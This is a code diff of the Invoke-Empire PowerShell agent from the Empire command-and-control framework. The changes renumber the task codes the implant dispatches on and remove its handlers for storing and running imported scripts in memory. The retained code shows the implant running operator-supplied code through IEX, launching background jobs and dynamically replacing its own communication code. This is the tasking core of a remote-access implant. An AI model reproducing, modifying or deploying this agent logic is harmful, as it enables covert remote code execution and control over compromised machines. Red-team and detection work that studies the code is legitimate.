@@ -1001,7 +1001,7 @@ function Invoke-Empire {
                 Encode-Packet -data $output -type $type -ResultID $ResultID;
                 $script:tasks[$ResultID]['status'] = 'completed'
             }
-            elseif($type -eq 44){
+            elseif($type -eq 116){
                 try{
                     $parts = $data.split(",");
                     $params = $parts[1..$parts.length];
@@ -1123,7 +1123,7 @@ function Invoke-Empire {
             }
 
             # dynamic code execution, wait for output, don't save output
-            elseif($type -eq 100 -or $type -eq 118) {
+            elseif($type -eq 100) {
                 $ResultData = IEX $data;
                 if($ResultData) {
                     Encode-Packet -type $type -data $ResultData -ResultID $ResultID;
@@ -1131,7 +1131,7 @@ function Invoke-Empire {
                 }
             }
             # dynamic code execution, wait for output, save output
-            elseif($type -eq 101 -or $type -eq 119) {
+            elseif($type -eq 101) {
                 # format- [15 chars of prefix][5 chars extension][data]
                 $prefix = $data.Substring(0,15);
                 $extension = $data.Substring(15,5);
@@ -1142,49 +1142,14 @@ function Invoke-Empire {
             }
 
             # dynamic code execution, no wait, don't save output
-            elseif($type -eq 110 -or $type -eq 112) {
+            elseif($type -eq 102) {
                 $jobID = Start-AgentJob $data;
                 $script:ResultIDs[$jobID]=$resultID;
                 Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
                 $script:tasks[$ResultID]['status'] = 'running'
             }
-            # dynamic code execution, no wait, save output
-            elseif($type -eq 111 -or $type -eq 113) {
-                Encode-Packet -type 0 -data '[!] Dynamic code execution, no wait, save output not implemented' -ResultID $ResultID;
-                $script:tasks[$ResultID]['status'] = 'unimplemented'
 
-                # Write-Host "'dynamic code execution, no wait, save output' not implemented!"
-
-                # format- [15 chars of prefix][5 chars extension][data]
-                # $prefix = $data.Substring(0,15)
-                # $extension = $data.Substring(15,5)
-                # $data = $data.Substring(20)
-                # $jobID = Start-AgentJob $data $prefix $extension
-                # $script:resultIDs[$jobID] = $resultID
-                # Encode-Packet -type 110 -data ("Job started: " + $jobID)
-            }
-
-            # import a dynamic script and save it in agent memory
-            elseif($type -eq 120) {
-                # encrypt the script for storage
-                $script:ImportedScript = Encrypt-Bytes $Encoding.GetBytes($data);
-                Encode-Packet -type $type -data "script successfully saved in memory" -ResultID $ResultID;
-                $script:tasks[$ResultID]['status'] = 'completed'
-            }
-
-            # execute a function in the currently imported script
-            elseif($type -eq 121) {
-                # decrypt the script in memory and execute the code as a background job
-                $script = Decrypt-Bytes $script:ImportedScript;
-                if ($script) {
-                    $jobID = Start-AgentJob ([System.Text.Encoding]::UTF8.GetString($script) + "; $data");
-                    $script:ResultIDs[$jobID]=$ResultID;
-                    Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
-                    $script:tasks[$ResultID]['status'] = 'running'
-                }
-            }
-
-            elseif($type -eq 130) {
+            elseif($type -eq 220) {
                 #Dynamically update agent comms
                 try {
                     IEX $data
@@ -1198,7 +1163,7 @@ function Invoke-Empire {
                 }
             }
 
-            elseif($type -eq 131) {
+            elseif($type -eq 221) {
                 # Update the listener name variable
                 $script:CurrentListenerName = $data;
 
